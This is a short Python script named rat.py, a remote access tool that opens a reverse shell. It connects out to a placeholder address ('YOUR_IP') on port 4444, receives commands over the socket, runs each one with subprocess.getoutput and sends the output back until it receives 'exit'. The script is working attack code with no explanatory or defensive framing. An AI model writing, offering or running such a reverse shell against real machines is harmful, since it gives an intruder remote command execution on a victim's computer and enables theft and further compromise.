# rat.py
import socket
import subprocess

s = socket.socket()
s.connect(("YOUR_IP", 4444))
while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

